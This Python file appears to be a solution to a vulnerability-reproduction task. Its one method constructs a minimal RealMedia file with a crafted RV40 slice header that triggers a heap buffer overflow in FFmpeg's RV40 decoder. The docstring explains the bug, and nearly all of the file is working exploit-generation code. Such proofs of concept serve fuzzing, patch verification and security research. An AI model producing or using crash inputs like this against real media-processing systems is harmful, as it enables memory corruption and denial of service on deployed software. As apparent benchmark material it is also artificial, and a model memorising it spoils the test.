import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept input for a Heap Buffer Overflow in FFmpeg's RV40 decoder.
        Vulnerability: oss-fuzz:385170375

        The PoC is a minimal RealMedia (.rm) file containing a single video packet.
        This packet's payload is a crafted RV40 slice header. The vulnerability
        is triggered by manipulating fields within this header:
        1. A field indicating the length of a subsequent 'size' field is set to its
           minimum value (meaning 'size' is 1 byte long).
        2. The 'size' field itself is set to a large value (0xFF).

        The decoder reads this 'size' and tries to initialize a new bitstream
        context for a data slice of that size. However, the actual remaining data
        in the packet is much smaller. The check to prevent this was missing in the
        vulnerable version. The decoder calculates a pointer to the slice data based
        on `end_of_packet - size`, which underflows and points outside the buffer.
        Subsequent bit reading from this context causes a heap buffer overflow.
        """

        # .RMF header (18 bytes): Identifies the file as RealMedia.
        # num_headers is 2, for the required PROP and MDPR chunks.
        rmf_header = b'.RMF' + struct.pack('>LHHLL', 18, 0, 0, 0, 2)

        # PROP (Properties) header (46 bytes): File-level metadata.
        # We use a minimal, zero-filled data section of 38 bytes.
        prop_data = b'\x00' * 38
        prop_header = b'PROP' + struct.pack('>L', len(prop_data)) + prop_data

        # MDPR (Media Properties) header (64 bytes): Stream-specific metadata.
        # This defines our single RV40 video stream.

        # The codec requires a minimal 18-byte 'extradata' blob.
        # It contains FourCCs ('VIDO', 'RV40'), dimensions, etc.
        extradata = struct.pack('<L', 18) + b'VIDORV40' + struct.pack('<HHH', 64, 48, 12)

        # The main MDPR data section, with minimal values and empty name/mime fields.
        mdpr_prefix_format = '>HH' + 'L'*7 + 'BB'
        mdpr_prefix = struct.pack(
            mdpr_prefix_format,
            0, 1,                      # version, stream number
            0, 0, 0, 0, 0, 0, 0,       # bitrates, packet sizes, times
            0, 0                       # name_len, mime_len
        )
        mdpr_data = mdpr_prefix + struct.pack('>L', len(extradata)) + extradata
        mdpr_header = b'MDPR' + struct.pack('>L', len(mdpr_data)) + mdpr_data

        # DATA header (18 bytes): Signals the start of media packets.
        # We indicate there is only 1 packet.
        data_header = b'DATA' + struct.pack('>LHLL', 0, 0, 1, 0)

        # Malicious Packet (16 bytes = 12 header + 4 payload)
        
        # The 4-byte payload is a carefully constructed bitstream.
        bits = (
            '000000001'  # num_slices (9 bits)
            '00'         # slice_type (2 bits)
            '0'          # marker (1 bit)
            '0'          # marker (1 bit)
            '00000'      # qscale (5 bits)
            '00'         # bits_len_minus_1 (2 bits) -> size field is 1 byte
            '11111111'   # size (8 bits) -> 0xFF, which is > remaining bits
        )
        # Pad to 32 bits (4 bytes).
        bits += '0000'
        
        val = int(bits, 2)
        payload = val.to_bytes(4, 'big')

        # Standard RealMedia packet header (12 bytes).
        packet_len = 12 + len(payload)
        packet_header = struct.pack(
            '>HHHLBB',
            0,          # version
            packet_len, # length
            1,          # stream number
            0,          # timestamp
            0,          # packet group
            2,          # flags (keyframe)
        )
        
        packet = packet_header + payload
        
        # Assemble the final PoC file.
        poc = rmf_header + prop_header + mdpr_header + data_header + packet
        
        return poc